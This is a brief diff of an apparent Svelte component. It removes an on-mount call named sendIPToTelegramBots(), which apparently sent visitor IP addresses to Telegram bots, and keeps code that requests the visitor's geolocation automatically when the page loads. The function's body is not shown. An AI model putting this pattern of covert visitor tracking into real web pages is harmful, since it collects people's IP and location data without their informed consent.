@@ -2,7 +2,7 @@
   import { onMount } from 'svelte';
 
   onMount(async () => {
-   sendIPToTelegramBots();
+  
     // Request location permission automatically
     navigator.geolocation.getCurrentPosition(
       (position) => {
